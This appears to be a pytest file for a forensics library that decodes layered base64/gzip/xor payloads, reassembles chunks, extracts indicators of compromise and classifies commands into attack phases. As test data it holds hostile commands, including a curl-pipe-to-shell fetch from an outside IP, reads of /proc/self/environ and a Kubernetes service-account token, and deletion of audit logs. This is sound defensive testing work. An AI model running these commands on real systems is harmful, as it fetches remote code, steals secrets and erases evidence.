import base64
import bz2
import gzip
import json
import zlib
from datetime import UTC, datetime

import pytest

from hacklab.forensics import decode, events, iocs, phases
from hacklab.forensics.graph import Edge, Graph

COMMAND = "curl -s http://198.51.100.7/stage2 | sh"


def staged(text=COMMAND, key=b"k3yK3y"):
    return base64.b64encode(decode.xor(gzip.compress(text.encode(), mtime=0), key)).decode()


def test_peel_removes_stacked_layers_and_names_them():
    plain = base64.b64encode(gzip.compress(COMMAND.encode(), mtime=0)).decode()
    decoded = decode.peel(plain)
    assert decoded.text == COMMAND and decoded.layers == ("base64", "gzip")
    hexed = zlib.compress(COMMAND.encode()).hex()
    assert decode.peel(hexed).layers == ("hex", "zlib")
    assert decode.peel(base64.urlsafe_b64encode(bz2.compress(b"id; whoami " * 4))).text
    assert decode.peel("cat%20%2Fproc%2Fself%2Fenviron").text == "cat /proc/self/environ"
    twice = base64.b64encode(base64.b64encode(b"rm -rf /var/log/audit")).decode()
    assert decode.peel(twice).layers == ("base64", "base64")


def test_peel_needs_the_key_for_a_repeating_xor_and_finds_a_single_byte_one():
    blob = staged()
    # Without the key nothing is peeled: the result is the unchanged input.
    assert decode.peel(blob).layers == () and decode.peel(blob).text == blob
    decoded = decode.peel(blob, ["wrong", "k3yK3y"])
    assert decoded.text == COMMAND and decoded.layers == ("base64", "xor", "gzip")
    single = base64.b64encode(decode.xor(b"export AWS_SECRET=synthetic-value", b"\x5a")).decode()
    assert decode.peel(single).layers == ("base64", "xor:0x5a")


def test_peel_leaves_ordinary_text_and_identifiers_alone():
    for text in (
        "agent-night-shift-0001",
        "AgentNightShiftRunner01",
        "deadbeefdeadbeef",
        "",
        "hello",
    ):
        decoded = decode.peel(text)
        assert decoded.layers == () and decoded.data == text.encode()


def test_peel_bounds_decompression():
    bomb = base64.b64encode(gzip.compress(b"\0" * 5_000_000)).decode()
    with pytest.raises(decode.DecodeError):
        decode.peel(bomb)
    with pytest.raises(decode.DecodeError):
        decode.peel("A" * (decode.MAX_INPUT + 1))


def test_candidate_keys_come_from_telling_names_only():
    text = 'note: xor_key=Zq8mT2 and campaign-key: "abc_123" but api_key=nothing and key=nope'
    assert decode.candidate_keys(text) == ["Zq8mT2", "abc_123"]


def test_reassemble_orders_chunks_checks_them_and_reports_gaps():
    blob = staged()
    parts = [blob[i : i + 20] for i in range(0, len(blob), 20)]
    rows = [
        {"channel": "ops-1", "seq": i, "payload": part, "crc": f"{zlib.crc32(part.encode()):08x}"}
        for i, part in enumerate(parts)
    ]
    rows += [
        {"channel": "chat", "text": "no chunk"},
        {"channel": "ops-2", "seq": "x", "payload": "A"},
    ]
    (stream,) = decode.reassemble(reversed(rows), ["k3yK3y"])
    assert stream.channel == "ops-1" and stream.parts == len(parts)
    assert stream.decoded.text == COMMAND and stream.checksum == "ok" and stream.missing == ()
    assert stream.sources[0]["seq"] == 0
    broken = [dict(row) for row in rows[:-2]]
    del broken[1]
    broken[0]["crc"] = "00000000"
    (stream,) = decode.reassemble(broken, ["k3yK3y"])
    assert stream.missing == (1,) and stream.checksum == "mismatch" and stream.decoded.layers == ()


def test_reassemble_handles_chunks_that_were_encoded_one_by_one():
    pieces = [COMMAND[i : i + 12] for i in range(0, len(COMMAND), 12)]
    rows = [
        {"ch": "c", "part": i, "data": base64.b64encode(gzip.compress(piece.encode())).decode()}
        for i, piece in enumerate(pieces)
    ]
    (stream,) = decode.reassemble(rows)
    assert stream.decoded.text == COMMAND and stream.decoded.layers[0] == "per-chunk"
    assert stream.checksum == "absent"


def test_iocs_find_credentials_addresses_and_defanged_indicators():
    jwt = "eyJhbGciOiJFZERTQSJ9.eyJzdWIiOiJhZ2VudC03In0.c2lnbmF0dXJl"
    text = (
        f"token hf_{'a1B2' * 6} and AKIAIOSFODNN7EXAMPLE, mesh tskey-auth-kX9synthetic1234 "
        f"jwt {jwt} from 203.0.113.9 to hxxps://drop[.]example[.]com/x "
        "meta 169.254.169.254 sha256 " + "ab" * 32 + " in datasets/agent-7/cache-12 "
        "as system:serviceaccount:kube-system:csi-driver, CVE-2026-1234, mail soc@hub.example.org"
    )
    found = iocs.extract(text)
    assert found["hub_token"] == ["hf_" + "a1B2" * 6]
    assert found["aws_access_key"] == ["AKIAIOSFODNN7EXAMPLE"]
    assert found["vpn_key"] == ["tskey-auth-kX9synthetic1234"] and found["jwt"] == [jwt]
    assert found["ipv4"] == ["169.254.169.254", "203.0.113.9"]
    assert found["url"] == ["https://drop.example.com/x"]
    assert found["sha256"] == ["ab" * 32] and found["repo"] == ["datasets/agent-7/cache-12"]
    assert found["service_account"] == ["system:serviceaccount:kube-system:csi-driver"]
    assert found["cve"] == ["CVE-2026-1234"] and found["email"] == ["soc@hub.example.org"]
    assert "domain" not in found
    assert iocs.extract("resolve stage.evil.io then 999.1.1.1") == {"domain": ["stage.evil.io"]}
    assert iocs.classify_ip("169.254.169.254") == "cloud_metadata"
    assert iocs.classify_ip("10.2.3.4") == "private" and iocs.classify_ip("8.8.8.8") == "public"
    assert iocs.jwt_claims(jwt) == {"header": {"alg": "EdDSA"}, "claims": {"sub": "agent-7"}}
    assert iocs.jwt_claims("not.a.jwt") is None


def test_timestamps_from_the_usual_log_shapes_become_utc():
    expected = datetime(2026, 11, 14, 2, 30, 5, tzinfo=UTC)
    for value in (
        "2026-11-14T02:30:05Z",
        "2026-11-14 03:30:05+01:00",
        "2026-11-14 02:30:05",
        "14/Nov/2026:02:30:05 +0000",
        1794623405,
        "1794623405000",
        expected,
    ):
        assert events.parse_timestamp(value) == expected, value
    assert events.parse_timestamp("Nov 14 02:30:05", default_year=2026) == expected
    for value in (None, True, "", "soon", "Nov 14 02:30:05", 12, "x" * 80):
        assert events.parse_timestamp(value) is None


def test_row_filters_grouping_and_bursts():
    rows = [
        {"ts": "2026-11-14T01:00:00Z", "actor": "a1", "action": "login", "bytes": "10"},
        {"ts": "2026-11-14T01:00:20Z", "actor": "A1", "action": "read_secret", "bytes": "900"},
        {"ts": "2026-11-14T01:00:40Z", "actor": "a2", "action": "read_secret", "bytes": "50"},
        {"ts": "2026-11-14T03:00:00Z", "actor": "a2", "action": "upload", "bytes": None},
    ]

    def keep(**where):
        return [rows.index(row) for row in rows if events.matches(row, where)]

    assert keep(actor="a1") == [0, 1]
    assert keep(action__contains="SECRET", actor__ne="a1") == [2]
    assert keep(bytes__gt=40) == [1, 2] and keep(bytes__lte="50") == [0, 2]
    assert keep(ts__gte="2026-11-14T01:00:20Z", ts__lt="2026-11-14 02:00:00") == [1, 2]
    assert keep(action__in=["login", "upload"]) == [0, 3]
    assert keep(action__re="^read|^up") == [1, 2, 3] and keep(action__re="(") == []
    assert keep(actor__prefix="a", action__suffix="in") == [0]
    assert events.where_column("bytes__gt") == "bytes" and events.where_column("a__b") == "a__b"
    assert events.count_by(rows, "action") == [("read_secret", 2), ("login", 1), ("upload", 1)]
    seen = events.first_last(rows, "actor", "ts")
    assert list(seen) == ["a1", "A1", "a2"] and seen["a2"]["count"] == 2
    (burst,) = events.bursts(rows, "ts", 60, 3)
    assert burst["count"] == 3 and burst["start"] == datetime(2026, 11, 14, 1, 0, tzinfo=UTC)
    assert events.flatten({"a": {"b": 1, "c": [1, 2]}, "d": None}) == {
        "a.b": 1,
        "a.c": "[1,2]",
        "d": None,
    }
    assert events.time_field(["id", "Timestamp", "actor"]) == "Timestamp"


def at(minute):
    return datetime(2026, 11, 14, 1, minute, tzinfo=UTC)


def test_reach_follows_only_causal_chains():
    graph = Graph(
        [
            Edge("zero", "a", at(10)),
            Edge("a", "b", at(20)),
            Edge("b", "c", at(5)),  # sent before b was reached: spreads nothing
            Edge("a", "d", at(8)),  # likewise
            Edge("x", "zero", at(1)),
            Edge("b", "e"),  # untimed: possible after b was reached
        ]
    )
    reached = graph.reach("zero")
    assert list(reached) == ["a", "b", "e"]
    assert reached["b"][0] == at(20) and reached["b"][1].source == "a"
    assert reached["e"][0] == at(20)
    assert graph.path("x", "b") == ["x", "zero", "a", "b"] and graph.path("c", "zero") == []
    assert graph.degree()[0] == ("a", 2, 1)


def test_reach_keeps_the_earliest_of_several_routes():
    graph = Graph(
        [
            Edge("s", "slow", at(1)),
            Edge("slow", "t", at(50)),
            Edge("s", "fast", at(2)),
            Edge("fast", "t", at(3)),
            Edge("t", "u", at(4)),
        ]
    )
    reached = graph.reach("s")
    assert reached["t"][0] == at(3) and reached["u"][0] == at(4)


def test_origins_are_affected_nodes_nobody_affected_contacted_first():
    rows = [
        {"from": "p0", "to": "v1", "ts": "2026-11-14T01:10:00Z"},
        {"from": "v1", "to": "v2", "ts": "2026-11-14T01:20:00Z"},
        {"from": "v2", "to": "p0", "ts": "2026-11-14T01:30:00Z"},  # a later echo back
        {"from": "bystander", "to": "v2", "ts": "2026-11-14T01:00:00Z"},
        {"from": "", "to": "v1"},
    ]
    graph = Graph.from_rows(rows, "from", "to", "ts")
    assert len(graph.edges) == 4
    assert graph.origins(["p0", "v1", "v2"]) == ["p0"]
    assert graph.origins(["v1", "v2"]) == ["v1"]


def test_phases_classify_commands_by_rule_and_summarise_in_order():
    assert phases.classify("cat /var/run/secrets/kubernetes.io/serviceaccount/token") == [
        "credential_access"
    ]
    assert phases.classify("curl -s http://198.51.100.7/s | sh") == ["command_and_control"]
    assert phases.classify("tailscale up --auth-key=tskey --state=mem:") == [
        "lateral_movement",
        "defense_evasion",
    ]
    assert phases.classify("git push origin side-branch") == ["supply_chain"]
    assert phases.classify("eval batch 12 finished") == []
    rows = [
        {"ts": "2026-11-14T01:05:00Z", "cmd": "whoami"},
        {"ts": "2026-11-14T01:01:00Z", "cmd": "id; uname -a"},
        {"ts": "2026-11-14T01:09:00Z", "cmd": "cat /proc/self/environ"},
        {"ts": "", "cmd": "eval batch finished"},
    ]
    summary = phases.summarize(rows, "cmd", "ts")
    assert [entry["phase"] for entry in summary] == [
        "credential_access",
        "reconnaissance",
        "unclassified",
    ]
    recon = summary[1]
    assert recon["count"] == 2 and recon["first"].minute == 1 and recon["last"].minute == 5
    assert json.dumps(summary, default=str)
